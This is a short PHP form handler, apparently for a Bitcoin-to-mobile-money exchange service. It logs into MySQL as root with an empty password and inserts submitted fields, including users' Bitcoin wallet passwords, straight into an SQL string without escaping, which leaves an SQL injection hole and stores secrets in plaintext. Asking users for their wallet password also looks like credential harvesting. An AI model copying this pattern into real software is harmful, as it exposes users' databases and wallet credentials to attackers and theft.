<?php 
$conection= mysqli_connect('localhost','root','','botmomo');
if(mysqli_connect_errno($conection)){
    echo "unsucessecful ".mysqli_connect_errno();
}
$btcaddrees1= $_POST['btcaddrees1'];
$btcpassword=$_POST['btcpassword'];
$amount1=$_POST['amount1'];
$momonumber1=$_POST['momonumber1'];


mysqli_query($conection,"INSERT INTO Btc_to_momo (btcaddress1,btcpassword,amount1,momonumber1) 
VALUES('$btcaddrees1','$btcpassword','$amount1','$momonumber1')");

?>